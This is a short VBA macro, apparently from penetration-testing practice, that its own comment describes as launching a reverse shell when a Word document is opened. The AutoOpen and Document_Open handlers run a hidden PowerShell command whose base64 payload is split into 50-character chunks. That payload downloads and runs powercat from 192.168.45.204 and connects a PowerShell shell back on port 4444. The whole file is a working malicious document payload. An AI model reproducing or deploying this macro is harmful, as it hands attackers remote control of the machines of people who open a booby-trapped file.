" a basic macro that will execute a reverse shell when the document is opened;
" the length of each str concatenation is 50 chars.

Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
	Dim Str As String

Str = Str + "powershell.exe -nop -w hidden -EncodedCommand SQBF"
Str = Str + "AFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG"
Str = Str + "0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8A"
Str = Str + "dwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOg"
Str = Str + "AvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA0AC8AcABv"
Str = Str + "AHcAZQByAGMAYQB0AC4AcABzADEAIgApADsAcABvAHcAZQByAG"
Str = Str + "MAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIA"
Str = Str + "MAA0ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcg"
Str = Str + "BzAGgAZQBsAGwA"

	CreateObject("Wscript.Shell").Run Str
End Sub

